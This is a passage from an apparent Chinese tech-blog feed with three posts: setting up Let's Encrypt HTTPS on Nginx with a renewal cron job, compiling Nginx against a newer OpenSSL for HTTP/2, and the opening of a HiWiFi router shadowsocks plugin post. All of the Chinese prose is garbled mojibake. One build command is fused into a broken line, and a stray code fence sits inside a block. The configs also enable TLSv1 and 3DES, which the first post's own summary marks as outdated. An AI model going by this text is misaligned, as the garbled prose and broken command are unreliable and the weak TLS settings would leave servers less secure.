qiwihui@qiwihui.com</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>/var/www/blog/</code>ä¸ºç½‘ç«™æ ¹ç›®å½•ã€‚è¯ä¹¦ç”³è¯·æˆåŠŸåä¼šæç¤ºä¸€ä¸‹ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯ä¹¦å­˜æ”¾ç›®å½•å’Œè¯ä¹¦è¿‡æœŸæ—¶é—´ï¼š</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">IMPORTANT NOTES:</span><br><span class="line"></span><br><span class="line">- Congratulations! Your certificate and chain have been saved at</span><br><span class="line">/etc/letsencrypt/live/qiwihui.com/fullchain.pem. Your cert will</span><br><span class="line">expire on 2016-07-08. To obtain a new version of the certificate <span class="keyword">in</span></span><br><span class="line">the future, simply run Let<span class="string">&#x27;s Encrypt again.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- If you like Let&#x27;</span>s Encrypt, please consider supporting our work by:</span><br><span class="line"></span><br><span class="line">Donating to ISRG / Let<span class="string">&#x27;s Encrypt:  https://letsencrypt.org/donate</span></span><br><span class="line"><span class="string">Donating to EFF:                    https://eff.org/donate-le</span></span><br></pre></td></tr></table></figure><p><em>é‡è¦æç¤º</em>ï¼šéœ€è¦å°†ç«™ç‚¹çš„DNSæŒ‡å‘å¯¹ç”¨çš„æœåŠ¡å™¨ï¼Œå¦åˆ™ä¼šæç¤ºç”³è¯·ä¸è¿‡ã€‚</p><ol start="3"><li>é…ç½®Nginx</li></ol><p>é¦–å…ˆç”Ÿæˆ2048ä½ DH parametersï¼š</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> -p /var/www/ssl/</span><br><span class="line">$ sudo openssl dhparam -out /var/www/ssl/dhparam.pem 2048</span><br></pre></td></tr></table></figure><p>Nginxçš„é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">server_name</span> qiwihui.com www.qiwihui.com;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line">        <span class="attribute">ssl_certificate</span>     /etc/letsencrypt/live/qiwihui.com/fullchain.pem;</span><br><span class="line">        <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/qiwihui.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">ssl_dhparam</span> /var/www/ssl/dhparam.pem;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">ssl_prefer_server_ciphers</span>  <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">ssl_ciphers</span> <span class="string">&#x27;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç½‘ç«™å…¶ä»–é…ç½®</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦å¼€å¯å…¨ç«™ https çš„è¯ï¼Œéœ€è¦å°† http è½¬å‘åˆ° httpsï¼Œå†æ·»åŠ ä¸€ä¸ª server å°±å¥½äº†ï¼š</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> qiwihui.com www.qiwihui.com;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œæˆåreload nginx å°±å¯ä»¥äº†ï¼š<code>nginx -s reload</code></p><h3><span id="yan-zheng-jian-ce">éªŒè¯æ£€æµ‹</span></h3><ol><li>ç”¨æµè§ˆå™¨æ‰“å¼€ç›®æ ‡ç½‘å€<code>https://qiwihui.com</code>ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°è¯ä¹¦ä¿¡æ¯ï¼š</li></ol><img width="792" alt="10-https-on-qiwihui-com" src="https://user-images.githubusercontent.com/3297411/45278285-064a6880-b4ff-11e8-9ff2-24cce84cdec8.png"><ol start="2"><li>ä½¿ç”¨ <a href="https://www.ssllabs.com/ssltest/index.html">Qualys ssllabs</a> åœ¨çº¿æµ‹è¯•æœåŠ¡å™¨è¯ä¹¦å¼ºåº¦ä»¥åŠé…ç½®æ­£ç¡®æ€§ï¼š</li></ol><img width="1374" alt="10-ssllabs-results" src="https://user-images.githubusercontent.com/3297411/45278293-0cd8e000-b4ff-11e8-80c6-a6cd4c8ce89e.png"><h3><span id="hou-xu-geng-xin">åç»­æ›´æ–°</span></h3><p>Letâ€™s Encrypt çš„æœ‰æ•ˆæœŸåªæœ‰90å¤©ï¼Œå®˜æ–¹å®¢æˆ·ç«¯ä¸æ”¯æŒæŒç»­æ›´æ–°ï¼Œæ‰€ä»¥è¦è®¾ç½®è‡ªåŠ¨æ›´æ–°ï¼Œè®©è¯ä¹¦ä¸€ç›´æœ‰æ•ˆã€‚</p><p>åœ¨crontab ä¸­è®¾ç½®å®šæ—¶ä»»åŠ¡ï¼š</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">30 2 * * 1 /root/letsencrypt/letsencrypt-auto renew &gt;&gt; /var/log/le-renew.log</span><br><span class="line">35 2 * * 1 /etc/init.d/nginx reload</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°é…ç½®ä¼šå†æ¯å‘¨ä¸€å‡Œæ™¨2:30æ‰§è¡Œ<code>letsencrypt-auto renew</code>ï¼Œåœ¨2ç‚¹35åˆ†é‡æ–°åŠ è½½nginxé…ç½®ï¼ŒåŒæ—¶æ›´æ–°æ—¥å¿—ä¼šåœ¨å†™åœ¨<code>/var/log/le-renewal.log</code>ä¸­ã€‚</p><h2><span id="zong-jie">æ€»ç»“</span></h2><p>Letâ€™s Encrypt TLS/SSL is free.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä½¿ç”¨å…è´¹çš„letâ€™s encryptè¯ä¹¦ä¸ºç½‘ç«™å¼€å¯httpsï¼ˆå·²è¿‡æ—¶ï¼‰
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>NginxæœåŠ¡å™¨è®¾ç½®HTTP/2</title>
    <link href="https://qiwihui.com/qiwihui-blog-22/"/>
    <id>https://qiwihui.com/qiwihui-blog-22/</id>
    <published>2018-10-09T05:38:41.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘çš„åšå®¢å·²ç»æ”¯æŒäº† HTTP/2, åœ¨æ­¤å°†ä»‹ç»å¦‚ä½•åœ¨ Nginx ä¸Šè®¾ç½® HTTP/2 åŠç›¸å…³æ³¨æ„äº‹é¡¹(å‘)ã€‚</p><h2><span id="qian-ti">å‰æ</span></h2><p>HTTP/2 å®‰è£…éœ€è¦ä»¥ä¸‹å‰æï¼š</p><ul><li>Nginx ç‰ˆæœ¬åœ¨1.9.5ä»¥ä¸Š</li><li>OpenSSL ç‰ˆæœ¬åœ¨ 1.0.2g ä»¥ä¸Šï¼ˆæ”¯æŒ ALPNï¼‰</li></ul><span id="more"></span><p>ä¸åŒ Linux ç³»ç»Ÿå¯¹äº <code>ALPN</code> å’Œ <code>NPN</code> çš„æ”¯æŒå¯ä»¥å‚è§ä¸‹è¡¨</p><table><thead><tr><th>Operating System</th><th>OpenSSL Version</th><th>ALPN and NPN Support</th></tr></thead><tbody><tr><td>CentOS/Oracle Linux/RHEL 5.10+</td><td>0.9.8e</td><td>Neither</td></tr><tr><td>CentOS/Oracle Linux/RHEL 6.5+, 7.0+</td><td>1.0.1e</td><td>NPN</td></tr><tr><td>Ubuntu 12.04 LTS</td><td>1.0.1</td><td>NPN</td></tr><tr><td>Ubuntu 14.04 LTS</td><td>1.0.1f</td><td>NPN</td></tr><tr><td>Ubuntu 16.04 LTS</td><td>1.0.2g</td><td>ALPN and NPN</td></tr><tr><td>Debian 7.0</td><td>1.0.1e</td><td>NPN</td></tr><tr><td>Debian 8.0</td><td>1.0.1k</td><td>NPN</td></tr></tbody></table><p>æ‰€ä»¥è¦ä¹ˆå‡çº§ä½¿ç”¨å¸¦æœ‰ OpenSSL 1.0.2 çš„ Ubuntu 16.04 LTSï¼Œè¦ä¹ˆä»å¤´ç¼–è¯‘ Nginx.</p><p>æˆ‘çš„æœåŠ¡å™¨ç³»ç»Ÿæ˜¯ Debian 7, OpenSSL ç‰ˆæœ¬æ˜¯1.0.1t, æ‰€ä»¥éœ€è¦é‡æ–°ç¼–è¯‘ Nginx å’Œ OpenSSL.</p><h2><span id="an-zhuang-guo-cheng">å®‰è£…è¿‡ç¨‹</span></h2><h3><span id="an-zhuang-openssl">å®‰è£… OpenSSL</span></h3><p>ä¸‹è½½å¹¶å®‰è£… OpenSSL:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd ~</span></span><br><span class="line"><span class="comment"># wget http://www.openssl.org/source/openssl-1.1.0e.tar.gz</span></span><br><span class="line"><span class="comment"># tar -zxf openssl-1.1.0e.tar.gz</span></span><br><span class="line"><span class="comment"># cd openssl-1.1.0e</span></span><br><span class="line"><span class="comment"># ./configure</span></span><br><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># sudo make install</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>openssl version</code> æ¥æŸ¥çœ‹å®‰è£…å¥½çš„ OpenSSL çš„ç‰ˆæœ¬ã€‚</p><h3><span id="qi-ta-nginx-bian-yi-xu-yao-de-huan-jing">å…¶ä»– Nginx ç¼–è¯‘éœ€è¦çš„ç¯å¢ƒ</span></h3><p>éœ€è¦ç¼–è¯‘ <code>PCRE</code> åº“å’Œ <code>zlib</code> åº“[]ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.40.tar.gz</span></span><br><span class="line"><span class="comment"># tar -zxf pcre-8.40.tar.gz</span></span><br><span class="line"><span class="comment"># cd pcre-8.40</span></span><br><span class="line"><span class="comment"># ./configure</span></span><br><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># sudo make install</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wget http://zlib.net/zlib-1.2.11.tar.gz</span></span><br><span class="line"><span class="comment"># tar -zxf zlib-1.2.11.tar.gz</span></span><br><span class="line"><span class="comment"># cd zlib-1.2.11</span></span><br><span class="line"><span class="comment"># ./configure</span></span><br><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># sudo make install</span></span><br></pre></td></tr></table></figure><h3><span id="bian-yi-nginx">ç¼–è¯‘ Nginx</span></h3><p>é¦–å…ˆï¼Œä¸‹è½½æœ€æ–°çš„ nginxï¼Œæˆ‘ä½¿ç”¨ 1.10.3.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">wget -c http://nginx.org/download/nginx-1.10.3.tar.gz</span><br><span class="line">tar xzvf nginx-1.10.3.tar.gzcd nginx-1.10.3</span><br></pre></td></tr></table></figure><p>å…¶å®ï¼Œè·å– Nginx é…ç½®å‚æ•°ï¼Œä½¿æ–°ç‰ˆ Nginx å’Œä¹‹å‰çš„é…ç½®ä¸€æ ·</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nginx -V</span></span><br><span class="line"></span><br><span class="line">nginx version: nginx/1.9.6</span><br><span class="line">built by gcc 4.7.2 (Debian 4.7.2-5) </span><br><span class="line">built with OpenSSL 1.0.1t  3 May 2016</span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-file-aio --with-threads --with-ipv6 --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_ssl_module --with-cc-opt=<span class="string">&#x27;-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 -fPIC&#x27;</span> --with-ld-opt=<span class="string">&#x27;-Wl,-z,relro -Wl,-z,now -Wl,--as-needed -pie&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°é…ç½®ç”¨å·²ç»æœ‰ <code>--with-http_v2_module</code> é€‰é¡¹äº†ï¼Œè¿˜éœ€è¦åœ¨ä¸Šè¿°é…ç½®å‚æ•°åé¢åŠ ä¸Š <code>--with-openssl=/path/to/your/openssl-1.1.0e</code> æŒ‡å‘æ–°ç‰ˆæœ¬çš„ OpenSSL æ–‡ä»¶å¤¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-file-aio --with-threads --with-ipv6 --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_ssl_module --with-cc-opt=<span class="string">&#x27;-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 -fPIC&#x27;</span> --with-ld-opt=<span class="string">&#x27;-Wl,-z,relro -Wl,-z,now -Wl,--as-needed -pie&#x27;</span> --with-openssl=/home/qiwihui/openssl-1.1.0e</span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line">å¯ä»¥çœ‹åˆ°å¤§è‡´è¾“å‡ºä¸º</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">Configuration summary</span><br><span class="line">  + using threads</span><br><span class="line">  + using system PCRE library</span><br><span class="line">  + using OpenSSL library: /home/qiwihui/openssl-1.1.0e</span><br><span class="line">  + md5: using OpenSSL library</span><br><span class="line">  + sha1: using OpenSSL library</span><br><span class="line">  + using system zlib library</span><br><span class="line"></span><br><span class="line">  nginx path prefix: <span class="string">&quot;/etc/nginx&quot;</span></span><br><span class="line">  nginx binary file: <span class="string">&quot;/usr/sbin/nginx&quot;</span></span><br><span class="line">  nginx modules path: <span class="string">&quot;/usr/lib/nginx/modules&quot;</span></span><br><span class="line">  nginx configuration prefix: <span class="string">&quot;/etc/nginx&quot;</span></span><br><span class="line">  nginx configuration file: <span class="string">&quot;/etc/nginx/nginx.conf&quot;</span></span><br><span class="line">  nginx pid file: <span class="string">&quot;/var/run/nginx.pid&quot;</span></span><br><span class="line">  nginx error <span class="built_in">log</span> file: <span class="string">&quot;/var/log/nginx/error.log&quot;</span></span><br><span class="line">  nginx http access <span class="built_in">log</span> file: <span class="string">&quot;/var/log/nginx/access.log&quot;</span></span><br><span class="line">  nginx http client request body temporary files: <span class="string">&quot;/var/cache/nginx/client_temp&quot;</span></span><br><span class="line">  nginx http proxy temporary files: <span class="string">&quot;/var/cache/nginx/proxy_temp&quot;</span></span><br><span class="line">  nginx http fastcgi temporary files: <span class="string">&quot;/var/cache/nginx/fastcgi_temp&quot;</span></span><br><span class="line">  nginx http uwsgi temporary files: <span class="string">&quot;/var/cache/nginx/uwsgi_temp&quot;</span></span><br><span class="line">  nginx http scgi temporary files: <span class="string">&quot;/var/cache/nginx/scgi_temp&quot;</span></span><br></pre></td></tr></table></figure><p>æœ€åï¼Œç¼–è¯‘å¹¶å®‰è£…</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># sudo make install</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå°±å¯ä»¥çœ‹åˆ°å·²ç»å®‰è£…å¥½äº†æ–°ç‰ˆ Nginxäº†ã€‚</p><h3><span id="pei-zhi">é…ç½®</span></h3><h4><span id="pei-zhi-https">é…ç½® HTTPS</span></h4><p>è¯·å‚è€ƒä¹‹å‰åšå®¢ <a href="https://blog.qiwihui.com/2016/04/10/enable-https/">ä½¿ç”¨å…è´¹çš„letâ€™s encryptè¯ä¹¦ä¸ºç½‘ç«™å¼€å¯https</a></p><h4><span id="kai-qi-http-2">å¼€å¯ http/2</span></h4><p>ç¬¬ä¸€æ­¥å®Œæˆåå°±è®¾ç½®å¥½äº†ä¸€ä¸ª HTTPS çš„ç½‘ç«™äº†ï¼Œåœ¨æ­¤åŸºç¡€ä¹‹ä¸Šå¼€å§‹ HTTP/2ã€‚é¦–å…ˆï¼Œå¼€å¯ HTTP/2ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listen 443 ssl http2 default_server;</span><br></pre></td></tr></table></figure><p>å…¶æ¬¡ï¼Œå»é™¤HTTP/2ä¸æ”¯æŒçš„æ—§çš„ä¸å®‰å…¨çš„å¯†ç å¥—ä»¶[5]:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line">ssl_ciphers EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæ£€æŸ¥é…ç½®å¹¶é‡å¯ Nginx:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nginx -t</span></span><br><span class="line"></span><br><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf <span class="built_in">test</span> is successful</span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo /etc/init.d/nginx restart</span></span><br></pre></td></tr></table></figure><h2><span id="jian-cha">æ£€æŸ¥</span></h2><p>è‡³æ­¤ï¼Œä¸å‡ºé—®é¢˜çš„è¯ä½ çš„æœåŠ¡å™¨å·²ç»å¼€å§‹æ”¯æŒ HTTP/2 äº†ï¼Œå¯ä»¥ä½¿ç”¨ <a href="https://tools.keycdn.com/http2-test">HTTP/2 Test</a> æ¥æ£€æµ‹æ˜¯å¦æ”¯æŒäº† HTTP/2</p><p><img src="/media/files/2017/02/19-qiwihui-com-http2.png" alt></p><p>å…¶ä¸­ï¼Œå¯¹ <code>ALPN</code> çš„æ”¯æŒå¯ä»¥ä½¿ç”¨ OpenSSL æ¥æ£€æµ‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> | openssl s_client -alpn h2 -connect qiwihui.com:443 | grep ALPN</span><br></pre></td></tr></table></figure><p>å¦‚æœè¾“å‡ºä¸­åŒ…å« <code>ALPN protocol: h2</code>ï¼Œè¯´æ˜æœåŠ¡ç«¯æ”¯æŒ <code>ALPN</code>ï¼Œå¦‚æœè¾“å‡ºä¸­åŒ…å« <code>No ALPN negotiated</code>ï¼Œè¯´æ˜æœåŠ¡ç«¯ä¸æ”¯æŒ <code>ALPN</code>ã€‚</p><p>åŒæ—¶ï¼Œåœ¨ Chrome çš„å¼€å‘è€…å·¥å…·ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°åè®®çš„ç‰ˆæœ¬</p><p><img src="/media/files/2017/02/19-qiwihui-com-chrome-http2.png" alt></p><p>åŒæ—¶è¿˜å¯ä»¥å¯¹ HTTP/2 è¿›è¡Œä¼˜åŒ–ï¼Œè¯·å‚è§[6]ï¼Œä¸èµ˜è¿°äº†ã€‚</p><h2><span id="fu-lu">é™„å½•</span></h2><p>é™„å½•ä¸€ä»½ Nginx çš„ http/2 ç®€å•é…ç½®</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 443 ssl http2 default_server;</span><br><span class="line">        listen [::]:443 ssl http2 default_server;</span><br><span class="line"></span><br><span class="line">        server_name example.com www.example.com; </span><br><span class="line"></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        ssl_certificate     /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line">        ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">        ssl_dhparam /path/to/your/dhparam.pem;</span><br><span class="line">        ssl_ciphers EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;</span><br><span class="line"></span><br><span class="line">        ssl_prefer_server_ciphers  on;</span><br><span class="line">        add_header Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubdomains;&quot;</span>;</span><br><span class="line">        ssl_session_cache shared:SSL:5m;</span><br><span class="line">        ssl_session_timeout 1h;</span><br><span class="line">        </span><br><span class="line">        root /path/to/your/folder/;</span><br><span class="line">        index index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    server_name example.com www.example.com;</span><br><span class="line">    <span class="built_in">return</span> 301 https://$server_name<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="can-kao">å‚è€ƒ</span></h2><p>[1]. <a href="https://www.nginx.com/blog/supporting-http2-google-chrome-users/">Supporting HTTP/2 for Google Chrome Users</a>[2]. <a href="https://imququ.com/post/enable-alpn-asap.html">ä¸ºä»€ä¹ˆæˆ‘ä»¬åº”è¯¥å°½å¿«æ”¯æŒ ALPNï¼Ÿ</a>[3]. <a href="https://www.nginx.com/resources/admin-guide/installing-nginx-open-source/">Nginxå®˜æ–¹æ•™ç¨‹ INSTALLING NGINX OPEN SOURCE</a>[4]. <a href="http://serverfault.com/a/733556/296724">serverfaulté—®é¢˜: Nginx configured with http2 doesnâ€™t deliver HTTP/2</a>[5]. <a href="https://http2.github.io/http2-spec/#BadCipherSuites">TLS 1.2 Cipher Suite Black List</a>[6]. <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-nginx-with-http-2-support-on-ubuntu-16-04#step-10-%E2%80%94-optimizing-nginx-for-best-performance">Optimizing Nginx for Best Performance</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      NginxæœåŠ¡å™¨è®¾ç½®HTTP/2
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>æè·¯ç”±+shadowsocksç¿»å¢™</title>
    <link href="https://qiwihui.com/qiwihui-blog-21/"/>
    <id>https://qiwihui.com/qiwihui-blog-21/</id>
    <published>2018-10-09T05:37:57.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>ç¿»å¢™æŠ˜è…¾æ— æ­¢å¢ƒ.ä½¿ç”¨è·¯ç”±å™¨ç¿»å¢™çš„ä¸€ä¸ªå¥½å¤„åœ¨äºï¼Œå¯¹äºä¸€äº›ç¿»å¢™é…ç½®å¾ˆç¹ççš„è®¾å¤‡ï¼Œåªéœ€è¦ç®€å•åœ°è¿ä¸Šè·¯ç”±wifiå°±å¯ä»¥å®ç°ç¿»å¢™ï¼Œæ¥å®¶é‡Œçš„æœ‹å‹ä¹Ÿå¯ä»¥ä¸éœ€è¦é…ç½®å°±å¯ä»¥ä¸€è¿ç¿»å¢™.</p><span id="more"></span><h2><span id="yi-xie-bei-jing">ä¸€äº›èƒŒæ™¯</span></h2><p>åœ¨æ—§ç‰ˆæœ¬çš„æè·¯ç”±å·²ç»æœ‰å¾ˆä¸é”™çš„ç¿»å¢™è®¾ç½®æ–¹å¼ï¼Œæ„Ÿè°¢å‰äººçš„å¤§æ ‘ï¼šä¸‰æµç«çš„shadwosocksæ’ä»¶.åœ¨æ—§ç‰ˆæœ¬çš„æè·¯ç”±ä¸Šè®¾ç½®shadowsocksç¿»å¢™å¯å·²å‚è€ƒ<a href="https://luolei.org/hiwifi-shadowsocks/">æè·¯ç”±Shadowsockså®¶åº­æ— ç—›ç¿»å¢™å®è·µ</a>.</p><p>æœ€è¿‘æè·¯ç”±æ›´æ–°äº†æ–°ç‰ˆæœ¬ï¼Œç®¡ç†ç•Œé¢é£æ ¼å¤§å˜å¯¼è‡´ä¹‹å‰çš„æ’ä»¶ä¸èƒ½ä½¿ç”¨ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†ä¸€æ®µæ—¶é—´ä¹Ÿæ²¡æœ‰çœ‹åˆ°æœ‰äººå¯¹ä¹‹å‰çš„æ’ä»¶è¿›è¡Œæ›´æ–°ï¼Œæ‰€ä»¥å†³å®šè‡ªå·±å†™ä¸€ä¸ª(å…¶å®åæ¥æ‰çŸ¥é“stary.loveä¹Ÿæœ‰å¯ç”¨çš„æ’ä»¶,æ¯”æˆ‘ä¿®æ”¹çš„æ’ä»¶åŠŸèƒ½å¼ºå¤§å¾ˆå¤š).æ‰€è°“çš„è‡ªå·±å†™ä¹Ÿåªæ˜¯åœ¨å‰äººçš„åŸºç¡€ä¸Šä¿®æ”¹ä¸ºé€‚åº”æ–°çš„æè·¯ç”±åå°ç®¡ç†å‡é¢. è¿™è¿‡ç¨‹è¦æ„Ÿè°¢stary.loveçš„å¸®åŠ©ï¼Œä¸ºæˆ‘æä¾›äº†æ—©æœŸæ’ä»¶çš„ä¸€äº›æºä»£ç ï¼Œä»¥åŠè®¸å¤šå¸®ç€æµ‹è¯•ä½¿ç”¨çš„äºº.</p><h2><span id="yi-xie-fang-fa">ä¸€äº›æ–¹æ³•</span></h2><p>é¡¹ç›®åœ°å€: <a href="https://github.com/qiwihui/hiwifi-ss">qiwihui/hiwifi-ss</a>, ç°åœ¨æ’ä»¶çš„çŠ¶æ€ï¼š</p><ol><li>ç•Œé¢ç»“æ„é€‚åº”äº†æ–°çš„hiwifiåå°ç®¡ç†ï¼›</li></ol><img width="1006" alt="07-ss-settings" src="https://user-images.githubusercontent.com/3297411/45278213-a9e74900-b4fe-11e8-962b-8fd448edfbed.png"><ol start="3"><li>å¼€å¯å…³é—­ç¿»å¢™åŠŸèƒ½å’Œè®¾ç½®dnsè§£æåŠŸèƒ½ä¹Ÿéƒ½æ¢å¤ï¼›</li></ol><img width="1008" alt="07-ss-advance" src="https://user-images.githubusercontent.com/3297411/45278223-b5d30b00-b4fe-11e8-88c5-cdf2437bfe6f.png"><ol start="3"><li>æ–°å¢åŠ äº†æœ€æ–°çš„gfwliståˆ—è¡¨(æˆªæ­¢åˆ°2016å¹´8æœˆ7æ—¥)çš„è·¯ç”±è§„åˆ™,è§£å†³äº†ä¹‹å‰æœ‰éƒ¨åˆ†ç½‘ç«™æ— 